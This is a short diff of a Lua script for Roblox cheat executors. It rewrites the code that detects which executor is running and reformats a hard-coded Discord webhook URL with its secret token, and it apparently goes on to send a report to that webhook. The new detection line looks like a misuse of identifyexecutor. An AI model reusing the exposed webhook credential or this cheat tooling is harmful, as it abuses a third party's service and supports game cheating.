@@ -1,14 +1,11 @@
  local executorCheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or IsElectron and "Electron" or
-   KRNL_LOADED and "Krnl"
-   if identifyexecutor() == "Valyse v1" then executorCheck = "Valyse"
-   if identifyexecutor() == "Fluxus" then executorCheck = "Fluxus"
-   end
-   end
+   KRNL_LOADED and "Krnl" or
+   IsValyse and "Valyse" or
+   identifyexecutor("Fluxus") and "Fluxus"
 
 
-local url =
-   "https://discord.com/api/webhooks/1134538199293755392/M5LP2euGwRX3_PixtH07ZteDeAlGt640qn6tDDleX-OcxILP6ORYpfdGkigzUSzDoAPM"
+local url = "https://discord.com/api/webhooks/1134538199293755392/M5LP2euGwRX3_PixtH07ZteDeAlGt640qn6tDDleX-OcxILP6ORYpfdGkigzUSzDoAPM"
 local data = {
    ["content"] = "",
    ["embeds"] = {
